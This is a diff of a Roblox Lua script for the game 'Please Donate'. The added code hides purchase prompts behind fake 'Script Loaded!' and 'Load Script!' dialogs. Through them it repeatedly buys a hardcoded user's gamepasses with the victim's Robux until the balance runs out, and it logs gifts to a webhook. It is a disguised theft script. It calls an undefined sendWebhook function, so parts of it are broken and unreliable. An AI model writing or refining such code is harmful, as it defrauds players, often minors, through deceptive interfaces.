@@ -1,64 +1,35 @@
--- Config
-local Username = "Ian_wp27" -- Coloque o username da pessoa que você quer doar
+local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
+local Username = "Ian_wp27"
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local SoundService = game:GetService("SoundService")
-local UserService = game:GetService("UserService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+
+local request = syn and syn.request or request
+if typeof(request) ~= "function" then
+    error("Request function not found!")
+end
 
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
-local LoadOfflinePlayer = require(ReplicatedStorage:WaitForChild("LoadOfflinePlayer"))
-local ToggleLoading = require(ReplicatedStorage:WaitForChild("ToggleLoading"))
-local popup = require(ReplicatedStorage:WaitForChild("popup"))
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
 
--- Função para pegar informações do usuário
-local function getUserInfoFromUsername(name)
-    local success, userId = pcall(function()
-        return Players:GetUserIdFromNameAsync(name)
-    end)
-    if not success then return nil end
-    return UserService:GetUserInfosByUserIdsAsync({userId})[1]
-end
+local asset
+local userRobux
 
--- Pegar saldo de Robux do jogador
-local function getUserRobux()
-    local success, balance = pcall(function()
-        return UserService:GetUserBalanceAsync(Players.LocalPlayer.UserId)
-    end)
-    if success then
-        return balance
-    else
-        warn("Não foi possível obter o saldo de Robux!")
-        return 0
-    end
-end
-
--- Função principal
-local function startGifting(targetUsername)
-    local userInfo = getUserInfoFromUsername(targetUsername)
-    if not userInfo then
-        SoundService.SFX.Fail:Play()
-        popup("warn", "Usuário inválido!")
-        ToggleLoading(false)
-        return
-    end
-
-    LoadOfflinePlayer(userInfo)
-
-    -- Invoca o booth offline
-    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userInfo.Id)
+if success then
+    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
     if not Booth then
-        Players.LocalPlayer:Kick("Receiver not found!")
-        return
+        return Players.LocalPlayer:Kick()
     end
 
-    local userRobux = getUserRobux()
-    local asset
-
-    -- Função para escolher o asset mais caro que consegue pagar
+    -- Função corrigida: compra o asset mais caro que você consegue pagar
     local function Purchase()
         local maxAffordable = 0
+        asset = nil
         for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
             if v:GetAttribute("AssetType") == "Gamepass" and
                not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
@@ -82,26 +53,71 @@ local function startGifting(targetUsername)
         task.wait(0.1)
     until PurchasePromptApp
 
-    -- Conecta eventos do Prompt para mobile/PC
-    PurchasePromptApp.ChildAdded:Connect(function(child)
+    -- Conecta eventos da UI, mobile/PC, etc.
+    local Animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+
+    Animator.ChildAdded:Connect(function(child)
         if child.Name == "Prompt" then
-            -- Aqui você pode ajustar a UI para mobile se quiser
-            -- Exemplo: mudar posição do botão
-            local Button
-            if child:FindFirstChild("MiddleContent") then
-                Button = child.MiddleContent
-            else
-                Button = child:FindFirstChild("Footer")
-            end
-            if Button then
-                -- Ajustes visuais se necessário
+            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+            if RemainingBalanceText then
+                if userRobux then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                    local Text = child.AlertContents.TitleContainer.TitleArea.Title
+                    Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
+                    child.AlertContents.MiddleContent.Visible = false
+                    child.AlertContents.Footer.Buttons["1"].Visible = false
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                    local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
+                    TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+                elseif asset then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                    child.AlertContents.MiddleContent.Visible = false
+                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                    child.AlertContents.Footer.Buttons["2"].Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+
+                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
+                    asset = nil
+                end
             end
         end
     end)
 
-    -- Faz a primeira compra
-    Purchase()
-end
+    Animator.ChildRemoved:Connect(function(child)
+        if child.Name == "Prompt" and userRobux then
+            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
+                Purchase()
+            end
+        end
+    end)
 
--- Inicia o script
-startGifting(Username)
+    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
+        if a == UserId and userRobux then
+            sendWebhook()
+            userRobux -= robux
+            Purchase()
+        end
+    end)
+
+    local range = math.huge
+    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+            local Attribute = v:GetAttribute("AssetPrice")
+            if Attribute < range then
+                asset = v
+                range = Attribute
+            end
+        end
+    end
+    if asset then
+        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+            print(range)
+        else
+            warn("??.")
+        end
+    end
+end
